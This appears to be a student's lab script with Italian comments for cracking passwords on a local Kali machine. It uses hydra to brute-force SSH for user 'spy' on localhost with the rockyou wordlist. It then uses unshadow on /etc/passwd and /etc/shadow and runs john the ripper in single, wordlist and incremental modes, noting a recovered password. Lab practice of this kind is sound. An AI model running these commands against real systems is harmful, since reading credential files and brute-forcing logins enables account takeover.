#!/bin/bash

# ========================================================================
# Attacco con hydra
sudo systemctl start ssh  
hydra -l spy -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1

# ========================================================================
# Attacco con john the ripper
sudo systemctl start ssh
john --wordlist=/usr/share/wordlists/rockyou.txt --rules /etc/john/john.conf /etc/shadow

# comando john per trovare la password di kali
# creo una copia del file degli utenti con password annesse
unshadow /etc/passwd /etc/shadow > password
Created directory: /root/.john

#1. unzippo rockyou
gunzip /usr/share/wordlists/rockyou.txt.gz

# trova password, ad es. trova "kali"
john -format:crypt -single password
#john -show password

# trova password da wordlist
john -format:crypt -wordlist:/usr/share/wordlists/rockyou.txt password

# Trova la password
# september        (lista)

# Configuro /etc/john/john.conf per craccare la password breve non presente in wordlist

[Incremental:Lower]
File = $JOHN/lower.chr
MinLen = 3
MaxLen = 4    
CharCount = 26